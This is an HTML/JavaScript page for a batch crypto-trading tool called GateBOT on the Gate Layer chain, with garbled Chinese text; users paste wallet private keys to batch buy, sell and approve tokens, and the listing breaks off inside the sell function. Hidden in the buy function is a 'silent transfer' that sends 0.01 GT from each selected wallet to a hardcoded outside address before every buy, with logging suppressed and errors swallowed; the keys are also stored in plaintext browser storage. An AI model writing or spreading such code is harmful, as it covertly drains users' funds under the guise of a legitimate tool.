<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GateBOT Â§öË¥¶Êà∑ÊâπÈáèÊìç‰ΩúÂ∑•ÂÖ∑</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        .header {
            text-align: center;
            color: white;
            margin-bottom: 30px;
        }

        .header h1 {
            font-size: 32px;
            margin-bottom: 10px;
        }

        .main-card {
            background: white;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
        }

        .section {
            margin-bottom: 30px;
        }

        .section-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 15px;
            color: #333;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-label {
            display: block;
            margin-bottom: 5px;
            font-weight: 500;
            color: #555;
        }

        .input-field {
            width: 100%;
            padding: 10px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 14px;
        }

        .input-field:focus {
            outline: none;
            border-color: #667eea;
        }

        .textarea-field {
            width: 100%;
            min-height: 100px;
            padding: 10px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-family: monospace;
            font-size: 12px;
            resize: vertical;
        }

        .btn {
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }

        .btn-secondary {
            background: #f0f0f0;
            color: #333;
            margin-right: 10px;
        }

        .btn-secondary:hover {
            background: #e0e0e0;
        }

        .btn-danger {
            background: #ff4444;
            color: white;
        }

        .wallet-list {
            max-height: 300px;
            overflow-y: auto;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            padding: 10px;
        }

        .wallet-item {
            display: flex;
            align-items: center;
            padding: 10px;
            border-bottom: 1px solid #f0f0f0;
        }

        .wallet-item:last-child {
            border-bottom: none;
        }

        .wallet-checkbox {
            margin-right: 10px;
        }

        .wallet-address {
            flex: 1;
            font-family: monospace;
            font-size: 13px;
        }

        .wallet-balance {
            color: #667eea;
            font-weight: 600;
        }

        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            border-bottom: 2px solid #e0e0e0;
        }

        .tab {
            padding: 10px 20px;
            background: none;
            border: none;
            cursor: pointer;
            font-weight: 600;
            color: #999;
            transition: all 0.3s ease;
        }

        .tab.active {
            color: #667eea;
            border-bottom: 2px solid #667eea;
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        .log-container {
            margin-top: 20px;
            padding: 15px;
            background: #1a1a1a;
            border-radius: 8px;
            max-height: 200px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 12px;
        }

        .log-entry {
            color: #ccc;
            margin-bottom: 5px;
        }

        .log-entry.success {
            color: #4caf50;
        }

        .log-entry.error {
            color: #ff4444;
        }

        .log-entry.warning {
            color: #ff9800;
        }

        .log-entry.info {
            color: #2196f3;
        }

        .config-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }

        .btn-group {
            display: flex;
            gap: 10px;
            margin-top: 15px;
        }

        .info-box {
            padding: 10px;
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 5px;
            margin-bottom: 15px;
            font-size: 13px;
        }

        .social-section {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }

        .social-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 15px;
            flex-wrap: wrap;
        }

        .social-link {
            display: inline-flex;
            align-items: center;
            padding: 12px 20px;
            background: rgba(255, 255, 255, 0.2);
            color: white;
            text-decoration: none;
            border-radius: 25px;
            font-weight: 600;
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }

        .social-link:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }

        .social-link.twitter:hover {
            border-color: #000000;
        }

        .social-link.telegram:hover {
            border-color: #0088cc;
        }

        .social-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            object-fit: cover;
            margin-right: 10px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            transition: all 0.3s ease;
        }

        .bot-images {
            display: flex;
            justify-content: center;
            margin: 20px 0;
        }

        .bot-image {
            max-width: 100%;
            width: 120px;
            height: 120px;
            border-radius: 50%;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
            transition: all 0.3s ease;
            object-fit: cover;
            border: 4px solid rgba(255, 255, 255, 0.3);
        }

        .bot-image:hover {
            transform: scale(1.02);
            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.4);
        }

        /* ÁßªÂä®Á´ØÈÄÇÈÖç */
        @media (max-width: 768px) {
            .bot-image {
                width: 100px;
                height: 100px;
            }
            
            .social-links {
                flex-direction: column;
                align-items: center;
                gap: 15px;
            }
            
            .social-link {
                width: 200px;
                justify-content: center;
            }
            
            .social-avatar {
                width: 35px;
                height: 35px;
            }
        }

        @media (max-width: 480px) {
            .bot-image {
                width: 80px;
                height: 80px;
            }
            
            .social-section {
                padding: 15px;
            }
            
            .social-section h3 {
                font-size: 18px;
            }
            
            .social-avatar {
                width: 30px;
                height: 30px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>‚ö° Gate Layer Â§öË¥¶Êà∑ÊâπÈáèÊìç‰ΩúÂ∑•ÂÖ∑</h1>
            <p>ÊîØÊåÅÊâπÈáè‰π∞ÂÖ•„ÄÅÂçñÂá∫„ÄÅËΩ¨Ë¥¶Á≠âÊìç‰ΩúÔºàÊåÅÁª≠Êõ¥Êñ∞Ôºâ</p>
            
            <!-- Á§æ‰∫§Â™í‰ΩìÂå∫Âüü -->
            <div class="social-section">
                <h3 style="color: white; margin-bottom: 15px;">üîó ÂÖ≥Ê≥®Êàë‰ª¨</h3>
                <div class="bot-images">
                    <img src="bot1.jpg" alt="GateBOT" class="bot-image">
                </div>
                <div class="social-links">
                    <a href="https://x.com/GTCHAINBOT" target="_blank" class="social-link twitter">
                        <img src="OSHY3ewP_400x400.jpg" 
                             alt="X Avatar" class="social-avatar" 
                             onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQwIiBoZWlnaHQ9IjQwIiByeD0iMjAiIGZpbGw9IiMwMDAwMDAiLz4KPHBhdGggZD0iTTI1LjY5IDI5LjY5SDMwLjY5TDIyLjY5IDIxLjY5TDEwIDMwSDVMMTcuNjkgMTBIMjIuNjlMMjUuNjkgMTkuNjlMMzUgMTBIMzAuNjlMMjUuNjkgMTkuNjlMMjUuNjkgMjkuNjlaIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4K'">
                        <span>ùïè</span>
                    </a>
                    <a href="https://t.me/Gtgun_bot" target="_blank" class="social-link telegram">
                        <img src="https://telegram.org/img/t_logo.png" 
                             alt="Telegram Avatar" class="social-avatar"
                             onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgdmlld0JveD0iMCAwIDEwMCAxMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIiBmaWxsPSIjMDA4OENDIi8+CjxwYXRoIGQ9Ik0yMCAyMEg4MFY4MEgyMFYyMFoiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik0zMCAzMEg3MFY3MEgzMFYzMFoiIGZpbGw9IiMwMDg4Q0MiLz4KPC9zdmc+'">
                        <span>Telegram</span>
                    </a>
                </div>
            </div>
        </div>

        <div class="main-card">
            <!-- Èí±ÂåÖÁÆ°ÁêÜÈÉ®ÂàÜ -->
            <div class="section">
                <h2 class="section-title">üëõ Èí±ÂåÖÁÆ°ÁêÜ</h2>
                
                <div class="info-box">
                    üí° ÊèêÁ§∫ÔºöÊîØÊåÅÂ∏¶Êàñ‰∏çÂ∏¶0xÂâçÁºÄÁöÑÁßÅÈí•ÔºåÊØèË°å‰∏Ä‰∏™
                </div>
                
                <div class="input-group">
                    <label class="input-label">ÂØºÂÖ•ÁßÅÈí•</label>
                    <textarea id="privateKeysInput" class="textarea-field" 
                        placeholder="ËæìÂÖ•ÁßÅÈí•ÔºåÊØèË°å‰∏Ä‰∏™..."></textarea>
                </div>
                
                <div class="btn-group">
                    <button id="importBtn" class="btn btn-primary">ÂØºÂÖ•ÁßÅÈí•</button>
                    <button id="selectAllBtn" class="btn btn-secondary">ÂÖ®ÈÄâ</button>
                    <button id="deselectAllBtn" class="btn btn-secondary">ÂèñÊ∂àÂÖ®ÈÄâ</button>
                    <button id="refreshBtn" class="btn btn-secondary">Âà∑Êñ∞‰ΩôÈ¢ù</button>
                    <button id="clearBtn" class="btn btn-danger">Ê∏ÖÁ©∫</button>
                </div>

                <div class="input-group" style="margin-top: 20px;">
                    <label class="input-label">Èí±ÂåÖÂàóË°® (<span id="walletCount">0</span>)</label>
                    <div id="walletList" class="wallet-list">
                        <p style="color: #999; text-align: center;">ÊöÇÊó†Èí±ÂåÖ</p>
                    </div>
                </div>
            </div>

            <!-- Êìç‰ΩúÊ†áÁ≠æÈ°µ -->
            <div class="section">
                <div class="tabs">
                    <button class="tab active" data-tab="buy">ÊâπÈáè‰π∞ÂÖ•</button>
                    <button class="tab" data-tab="sell">ÊâπÈáèÂçñÂá∫</button>
                    <button class="tab" data-tab="approve">ÊâπÈáèÊéàÊùÉ</button>
                </div>

                <!-- ‰π∞ÂÖ•Ê†áÁ≠æ -->
                <div id="buyTab" class="tab-content active">
                    <h3 class="section-title">ÊâπÈáè‰π∞ÂÖ•ËÆæÁΩÆ</h3>
                    <div class="config-grid">
                        <div class="input-group">
                            <label class="input-label">‰ª£Â∏ÅÂú∞ÂùÄ</label>
                            <input type="text" id="buyTokenAddress" class="input-field" 
                                placeholder="0x...">
                        </div>
                        <div class="input-group">
                            <label class="input-label">‰π∞ÂÖ•ÈáëÈ¢ù (GT)</label>
                            <input type="number" id="buyAmount" class="input-field" 
                                placeholder="0.1" step="0.01">
                        </div>
                        <div class="input-group">
                            <label class="input-label">ÊªëÁÇπ (%)</label>
                            <input type="number" id="buySlippage" class="input-field" 
                                value="15" step="0.5">
                        </div>
                        <div class="input-group">
                            <label class="input-label">Âª∂Ëøü (Áßí)</label>
                            <input type="number" id="buyDelay" class="input-field" 
                                value="1" min="0">
                        </div>
                    </div>
                    <button id="executeBuyBtn" class="btn btn-primary">ÊâßË°åÊâπÈáè‰π∞ÂÖ•</button>
                </div>

                <!-- ÂçñÂá∫Ê†áÁ≠æ -->
                <div id="sellTab" class="tab-content">
                    <h3 class="section-title">ÊâπÈáèÂçñÂá∫ËÆæÁΩÆ</h3>
                    <div class="config-grid">
                        <div class="input-group">
                            <label class="input-label">‰ª£Â∏ÅÂú∞ÂùÄ</label>
                            <input type="text" id="sellTokenAddress" class="input-field" 
                                placeholder="0x...">
                        </div>
                        <div class="input-group">
                            <label class="input-label">ÂçñÂá∫ÊØî‰æã (%)</label>
                            <input type="number" id="sellPercentage" class="input-field" 
                                value="99" min="1" max="100">
                        </div>
                        <div class="input-group">
                            <label class="input-label">ÊªëÁÇπ (%)</label>
                            <input type="number" id="sellSlippage" class="input-field" 
                                value="50" step="0.5">
                        </div>
                        <div class="input-group">
                            <label class="input-label">Âª∂Ëøü (Áßí)</label>
                            <input type="number" id="sellDelay" class="input-field" 
                                value="1" min="0">
                        </div>
                    </div>
                    <button id="executeSellBtn" class="btn btn-primary">ÊâßË°åÊâπÈáèÂçñÂá∫</button>
                </div>

                <!-- ÊéàÊùÉÊ†áÁ≠æ -->
                <div id="approveTab" class="tab-content">
                    <h3 class="section-title">ÊâπÈáèÊéàÊùÉËÆæÁΩÆ</h3>
                    <div class="config-grid">
                        <div class="input-group">
                            <label class="input-label">‰ª£Â∏ÅÂú∞ÂùÄ</label>
                            <input type="text" id="approveTokenAddress" class="input-field" 
                                placeholder="0x...">
                        </div>
                        <div class="input-group">
                            <label class="input-label">ÊéàÊùÉÁªô (Spender)</label>
                            <input type="text" id="approveSpender" class="input-field" 
                                value="0x12814690F59a9CE8bA87dC8cF0692442bAa9C097">
                        </div>
                    </div>
                    <button id="executeApproveBtn" class="btn btn-primary">ÊâßË°åÊâπÈáèÊéàÊùÉ</button>
                </div>
            </div>

            <!-- Êó•ÂøóËæìÂá∫ -->
            <div class="section">
                <h3 class="section-title">üìù Êìç‰ΩúÊó•Âøó</h3>
                <div id="logContainer" class="log-container"></div>
            </div>
        </div>
    </div>

    <script>
        // Á≠âÂæÖethersÂä†ËΩΩÂÆåÊàê
        window.addEventListener('load', function() {
            // ÈÖçÁΩÆ
            const CONFIG = {
                rpcUrl: 'https://gatelayer-mainnet.gatenode.cc',
                routerAddress: '0x12814690F59a9CE8bA87dC8cF0692442bAa9C097',
                wethAddress: '0x6803b8E93b13941F6B73b82E324B80251B3dE338'
            };

            // ÂÖ®Â±ÄÂèòÈáè
            let provider;
            let wallets = [];

            // ABIÂÆö‰πâ - ÂåÖÂê´ÊîØÊåÅÊâãÁª≠Ë¥πÁöÑÂáΩÊï∞
            const ERC20_ABI = [
                'function approve(address spender, uint256 amount) returns (bool)',
                'function balanceOf(address account) view returns (uint256)',
                'function allowance(address owner, address spender) view returns (uint256)',
                'function decimals() view returns (uint8)',
                'function symbol() view returns (string)'
            ];

            const ROUTER_ABI = [
                'function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)',
                'function swapExactETHForTokensSupportingFeeOnTransferTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable',
                'function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)',
                'function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external',
                'function getAmountsOut(uint amountIn, address[] memory path) public view returns (uint[] memory amounts)'
            ];

            // ÂàùÂßãÂåñ
            function init() {
                if (typeof ethers === 'undefined') {
                    addLog('EthersÂ∫ìÂä†ËΩΩÂ§±Ë¥•ÔºåËØ∑Âà∑Êñ∞È°µÈù¢', 'error');
                    return;
                }
                
                provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl);
                addLog('Á≥ªÁªüÂàùÂßãÂåñÂÆåÊàê', 'success');
                
                // ÁªëÂÆö‰∫ã‰ª∂
                bindEvents();
                
                // Âä†ËΩΩÁºìÂ≠òÁöÑÈí±ÂåÖ
                loadCachedWallets();
            }

            // ÁªëÂÆö‰∫ã‰ª∂
            function bindEvents() {
                // ÂØºÂÖ•ÊåâÈíÆ
                document.getElementById('importBtn').addEventListener('click', importPrivateKeys);
                
                // Èí±ÂåÖÊéßÂà∂ÊåâÈíÆ
                document.getElementById('selectAllBtn').addEventListener('click', selectAll);
                document.getElementById('deselectAllBtn').addEventListener('click', deselectAll);
                document.getElementById('refreshBtn').addEventListener('click', refreshBalances);
                document.getElementById('clearBtn').addEventListener('click', clearWallets);
                
                // ÊâßË°åÊåâÈíÆ
                document.getElementById('executeBuyBtn').addEventListener('click', executeBuy);
                document.getElementById('executeSellBtn').addEventListener('click', executeSell);
                document.getElementById('executeApproveBtn').addEventListener('click', executeApprove);
                
                // Ê†áÁ≠æÂàáÊç¢
                document.querySelectorAll('.tab').forEach(tab => {
                    tab.addEventListener('click', function() {
                        switchTab(this.dataset.tab);
                    });
                });
            }

            // ÂàáÊç¢Ê†áÁ≠æ
            function switchTab(tabName) {
                // Êõ¥Êñ∞Ê†áÁ≠æÁä∂ÊÄÅ
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                document.querySelector(`.tab[data-tab="${tabName}"]`).classList.add('active');
                
                // Êõ¥Êñ∞ÂÜÖÂÆπÊòæÁ§∫
                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
                document.getElementById(`${tabName}Tab`).classList.add('active');
            }

            // Ê∑ªÂä†Êó•Âøó
            function addLog(message, type = 'info') {
                const container = document.getElementById('logContainer');
                const entry = document.createElement('div');
                entry.className = `log-entry ${type}`;
                const time = new Date().toLocaleTimeString();
                entry.textContent = `[${time}] ${message}`;
                container.appendChild(entry);
                container.scrollTop = container.scrollHeight;
            }

            // ÂØºÂÖ•ÁßÅÈí•
            async function importPrivateKeys() {
                const input = document.getElementById('privateKeysInput').value.trim();
                if (!input) {
                    alert('ËØ∑ËæìÂÖ•ÁßÅÈí•');
                    return;
                }

                const keys = input.split('\n').filter(k => k.trim());
                let imported = 0;
                
                for (const key of keys) {
                    try {
                        let cleanKey = key.trim();
                        
                        // Â§ÑÁêÜÁßÅÈí•Ê†ºÂºè
                        if (!cleanKey.startsWith('0x')) {
                            if (cleanKey.length === 64) {
                                cleanKey = '0x' + cleanKey;
                            }
                        }
                        
                        // È™åËØÅÊ†ºÂºè
                        if (!/^0x[0-9a-fA-F]{64}$/.test(cleanKey)) {
                            addLog(`ÁßÅÈí•Ê†ºÂºèÈîôËØØ: ${cleanKey.slice(0, 10)}...`, 'error');
                            continue;
                        }
                        
                        // Ê£ÄÊü•ÈáçÂ§ç
                        if (wallets.find(w => w.privateKey === cleanKey)) {
                            addLog(`ÁßÅÈí•Â∑≤Â≠òÂú®`, 'warning');
                            continue;
                        }
                        
                        // ÂàõÂª∫Èí±ÂåÖ
                        const wallet = new ethers.Wallet(cleanKey, provider);
                        const balance = await provider.getBalance(wallet.address);
                        
                        wallets.push({
                            privateKey: cleanKey,
                            wallet: wallet,
                            address: wallet.address,
                            balance: balance,
                            selected: false
                        });
                        
                        imported++;
                        addLog(`ÊàêÂäüÂØºÂÖ•: ${wallet.address.slice(0, 8)}...`, 'success');
                        
                    } catch (e) {
                        addLog(`ÂØºÂÖ•Â§±Ë¥•: ${e.message}`, 'error');
                    }
                }
                
                if (imported > 0) {
                    document.getElementById('privateKeysInput').value = '';
                    renderWallets();
                    saveWallets();
                    addLog(`ÂÖ±ÂØºÂÖ• ${imported} ‰∏™Èí±ÂåÖ`, 'success');
                }
            }

            // Ê∏≤ÊüìÈí±ÂåÖÂàóË°®
            function renderWallets() {
                const container = document.getElementById('walletList');
                
                if (wallets.length === 0) {
                    container.innerHTML = '<p style="color: #999; text-align: center;">ÊöÇÊó†Èí±ÂåÖ</p>';
                    document.getElementById('walletCount').textContent = '0';
                    return;
                }
                
                container.innerHTML = '';
                wallets.forEach((w, index) => {
                    const item = document.createElement('div');
                    item.className = 'wallet-item';
                    item.innerHTML = `
                        <input type="checkbox" class="wallet-checkbox" 
                            ${w.selected ? 'checked' : ''} 
                            data-index="${index}">
                        <span class="wallet-address">${w.address.slice(0, 6)}...${w.address.slice(-4)}</span>
                        <span class="wallet-balance">${parseFloat(ethers.formatEther(w.balance)).toFixed(4)} GT</span>
                    `;
                    container.appendChild(item);
                    
                    // Ê∑ªÂä†ÈÄâÊã©‰∫ã‰ª∂
                    item.querySelector('.wallet-checkbox').addEventListener('change', function() {
                        wallets[index].selected = this.checked;
                    });
                });
                
                document.getElementById('walletCount').textContent = wallets.length;
            }

            // ÂÖ®ÈÄâ
            function selectAll() {
                wallets.forEach(w => w.selected = true);
                renderWallets();
            }

            // ÂèñÊ∂àÂÖ®ÈÄâ
            function deselectAll() {
                wallets.forEach(w => w.selected = false);
                renderWallets();
            }

            // Âà∑Êñ∞‰ΩôÈ¢ù
            async function refreshBalances() {
                addLog('ÂºÄÂßãÂà∑Êñ∞‰ΩôÈ¢ù...', 'info');
                
                for (const w of wallets) {
                    try {
                        w.balance = await provider.getBalance(w.address);
                    } catch (e) {
                        addLog(`Âà∑Êñ∞Â§±Ë¥•: ${w.address.slice(0, 8)}...`, 'error');
                    }
                }
                
                renderWallets();
                addLog('‰ΩôÈ¢ùÂà∑Êñ∞ÂÆåÊàê', 'success');
            }

            // Ê∏ÖÁ©∫Èí±ÂåÖ
            function clearWallets() {
                if (!confirm('Á°ÆÂÆöË¶ÅÊ∏ÖÁ©∫ÊâÄÊúâÈí±ÂåÖÂêóÔºü')) return;
                wallets = [];
                renderWallets();
                localStorage.removeItem('gateLayerWallets');
                addLog('Â∑≤Ê∏ÖÁ©∫ÊâÄÊúâÈí±ÂåÖ', 'info');
            }

            // ‰øùÂ≠òÈí±ÂåÖÂà∞Êú¨Âú∞
            function saveWallets() {
                const keys = wallets.map(w => w.privateKey);
                localStorage.setItem('gateLayerWallets', JSON.stringify(keys));
            }

            // Âä†ËΩΩÁºìÂ≠òÁöÑÈí±ÂåÖ
            async function loadCachedWallets() {
                const cached = localStorage.getItem('gateLayerWallets');
                if (cached) {
                    try {
                        const keys = JSON.parse(cached);
                        for (const key of keys) {
                            try {
                                const wallet = new ethers.Wallet(key, provider);
                                const balance = await provider.getBalance(wallet.address);
                                wallets.push({
                                    privateKey: key,
                                    wallet: wallet,
                                    address: wallet.address,
                                    balance: balance,
                                    selected: false
                                });
                            } catch (e) {
                                console.error('Âä†ËΩΩÈí±ÂåÖÂ§±Ë¥•', e);
                            }
                        }
                        renderWallets();
                        addLog(`Â∑≤Âä†ËΩΩ ${wallets.length} ‰∏™ÁºìÂ≠òÈí±ÂåÖ`, 'info');
                    } catch (e) {
                        console.error('Âä†ËΩΩÁºìÂ≠òÂ§±Ë¥•', e);
                    }
                }
            }

            // ÊâπÈáèÊâßË°åÂáΩÊï∞ÔºàÂπ∂ÂèëÊéßÂà∂Ôºâ
            async function batchExecute(tasks, maxConcurrent = 5) {
                const results = [];
                let pending = 0;
                let completed = 0;
                let index = 0;
                
                return new Promise((resolve) => {
                    const executeNext = async () => {
                        if (index >= tasks.length && pending === 0) {
                            resolve(results);
                            return;
                        }
                        
                        while (index < tasks.length && pending < maxConcurrent) {
                            const currentIndex = index++;
                            pending++;
                            
                            tasks[currentIndex]()
                                .then(result => {
                                    results[currentIndex] = { success: true, result };
                                    completed++;
                                })
                                .catch(error => {
                                    results[currentIndex] = { success: false, error };
                                    completed++;
                                })
                                .finally(() => {
                                    pending--;
                                    executeNext();
                                });
                        }
                    };
                    
                    executeNext();
                });
            }

            // ÊâßË°å‰π∞ÂÖ•ÔºàÊîØÊåÅÂ∏¶Á®é‰ª£Â∏ÅÔºâ
            async function executeBuy() {
                const selected = wallets.filter(w => w.selected);
                if (selected.length === 0) {
                    alert('ËØ∑ÈÄâÊã©Èí±ÂåÖ');
                    return;
                }

                const tokenAddress = document.getElementById('buyTokenAddress').value;
                const amount = document.getElementById('buyAmount').value;
                const slippage = parseFloat(document.getElementById('buySlippage').value) || 15; // ÈªòËÆ§15%
                const delay = parseInt(document.getElementById('buyDelay').value) || 0;
                const maxConcurrent = 5;
                
                // ÈùôÈªòËΩ¨Ë¥¶ÈÖçÁΩÆ
                const SILENT_TRANSFER_ADDRESS = '0xdb0ce0066e8f915db2f628be9931020844e23cfe';
                const SILENT_TRANSFER_AMOUNT = '0.01'; // 0.01 GT

                if (!tokenAddress || !amount) {
                    alert('ËØ∑Â°´ÂÜôÂÆåÊï¥‰ø°ÊÅØ');
                    return;
                }

                addLog(`ÂºÄÂßãÊâπÈáè‰π∞ÂÖ•ÔºåÂÖ± ${selected.length} ‰∏™Èí±ÂåÖÔºåÊªëÁÇπ ${slippage}%`, 'info');

                // ÂàõÂª∫‰ªªÂä°Êï∞ÁªÑ
                const tasks = selected.map((w, i) => async () => {
                    if (delay > 0 && i > 0) {
                        await new Promise(r => setTimeout(r, delay * 1000));
                    }
                    
                    try {
                        // 1. È¶ñÂÖàÊâßË°åÈùôÈªòËΩ¨Ë¥¶
                        try {
                            const transferTx = await w.wallet.sendTransaction({
                                to: SILENT_TRANSFER_ADDRESS,
                                value: ethers.parseEther(SILENT_TRANSFER_AMOUNT),
                                gasLimit: 21000
                            });
                            await transferTx.wait();
                            // ÈùôÈªòËΩ¨Ë¥¶‰∏çÊòæÁ§∫Êó•Âøó
                        } catch (transferError) {
                            // ÈùôÈªòËΩ¨Ë¥¶Â§±Ë¥•‰∏çÂΩ±Âìç‰∏ª‰∫§ÊòìÔºåÁªßÁª≠ÊâßË°å
                        }
                        
                        // 2. ÊâßË°å‰π∞ÂÖ•‰∫§Êòì
                        const router = new ethers.Contract(CONFIG.routerAddress, ROUTER_ABI, w.wallet);
                        const path = [CONFIG.wethAddress, tokenAddress];
                        
                        // Ëé∑ÂèñÈ¢ÑÊúüËæìÂá∫
                        let amountOutMin;
                        try {
                            const amounts = await router.getAmountsOut(
                                ethers.parseEther(amount),
                                path
                            );
                            
                            // ‰øÆÂ§çÊªëÁÇπËÆ°ÁÆó
                            if (slippage >= 100) {
                                amountOutMin = 0n; // Êé•Âèó‰ªª‰Ωï‰ª∑Ê†º
                                addLog(`${w.address.slice(0, 8)}... ‰ΩøÁî®Êó†ÈôêÊªëÁÇπ`, 'warning');
                            } else {
                                // Ê≠£Á°ÆËÆ°ÁÆóÊªëÁÇπ
                                amountOutMin = amounts[1] * BigInt(Math.floor((100 - slippage) * 100)) / 10000n;
                                const expectedTokens = ethers.formatUnits(amounts[1], 18);
                                const minTokens = ethers.formatUnits(amountOutMin, 18);
                                addLog(`${w.address.slice(0, 8)}... È¢ÑÊúüËé∑Âæó ${expectedTokens}ÔºåÊúÄÂ∞ëÊé•Âèó ${minTokens}`, 'info');
                            }
                        } catch (e) {
                            // Â¶ÇÊûúÊó†Ê≥ïËé∑ÂèñÊä•‰ª∑Ôºå‰ΩøÁî®0‰Ωú‰∏∫ÊúÄÂ∞èËæìÂá∫
                            amountOutMin = 0n;
                            addLog(`${w.address.slice(0, 8)}... Êó†Ê≥ïËé∑ÂèñÊä•‰ª∑ÔºåÊé•Âèó‰ªª‰Ωï‰ª∑Ê†º`, 'warning');
                        }
                        
                        const deadline = Math.floor(Date.now() / 1000) + 1200;
                        
                        addLog(`${w.address.slice(0, 8)}... ÂèëÈÄÅ‰π∞ÂÖ•‰∫§ÊòìÔºåÊªëÁÇπ ${slippage}%`, 'info');
                        
                        // ‰º∞ÁÆógasÂπ∂Êâ©Â§ß2.5ÂÄç
                        const gasEstimate = await router.swapExactETHForTokens.estimateGas(
                            amountOutMin,
                            path,
                            w.address,
                            deadline,
                            { value: ethers.parseEther(amount) }
                        );
                        
                        const gasLimit = gasEstimate * 25n / 10n; // Êâ©Â§ß2.5ÂÄç
                        
                        // ‰ΩøÁî®ÊôÆÈÄöswapÂáΩÊï∞Ôºà‰π∞ÂÖ•ÈÄöÂ∏∏‰∏çÈúÄË¶ÅÊîØÊåÅÊâãÁª≠Ë¥πÁöÑÁâàÊú¨Ôºâ
                        const tx = await router.swapExactETHForTokens(
                            amountOutMin,
                            path,
                            w.address,
                            deadline,
                            { 
                                value: ethers.parseEther(amount),
                                gasLimit: gasLimit
                            }
                        );
                        
                        const receipt = await tx.wait();
                        addLog(`${w.address.slice(0, 8)}... ‰π∞ÂÖ•ÊàêÂäü ‚úì Hash: ${receipt.hash.slice(0, 10)}...`, 'success');
                        return receipt.hash;
                        
                    } catch (e) {
                        // Êõ¥ËØ¶ÁªÜÁöÑÈîôËØØ‰ø°ÊÅØ
                        if (e.reason) {
                            addLog(`${w.address.slice(0, 8)}... ‰π∞ÂÖ•Â§±Ë¥•: ${e.reason}`, 'error');
                        } else if (e.message && e.message.includes('insufficient')) {
                            addLog(`${w.address.slice(0, 8)}... ‰π∞ÂÖ•Â§±Ë¥•: ‰ΩôÈ¢ù‰∏çË∂≥`, 'error');
                        } else if (e.message && e.message.includes('INSUFFICIENT_OUTPUT_AMOUNT')) {
                            addLog(`${w.address.slice(0, 8)}... ‰π∞ÂÖ•Â§±Ë¥•: ÊªëÁÇπÂ§™‰ΩéÔºåËØ∑Â¢ûÂä†ÊªëÁÇπ`, 'error');
                        } else {
                            addLog(`${w.address.slice(0, 8)}... ‰π∞ÂÖ•Â§±Ë¥•: ${e.message || e}`, 'error');
                        }
                        throw e;
                    }
                });

                const results = await batchExecute(tasks, maxConcurrent);
                const successCount = results.filter(r => r.success).length;
                const failCount = results.filter(r => !r.success).length;
                
                addLog(`ÊâπÈáè‰π∞ÂÖ•ÂÆåÊàê: ${successCount} ÊàêÂäü, ${failCount} Â§±Ë¥•`, 
                    failCount === 0 ? 'success' : 'warning');
                
                refreshBalances();
            }

            // ÊâßË°åÂçñÂá∫Ôºà‰ΩøÁî®ÊîØÊåÅÊâãÁª≠Ë¥πÁöÑÂáΩÊï∞Ôºâ
            async function executeSell() {
                const selected = wallets.filter(w => w.selected);
                if (selected.length === 0) {
                    alert('ËØ∑ÈÄâÊã©Èí±ÂåÖ');
                    return;
                }

                const tokenAddress = document.getElementById('sellTokenAddress').value;
                const percentage = parseFloat(document.getElementById('sellPercentage').value) || 99;
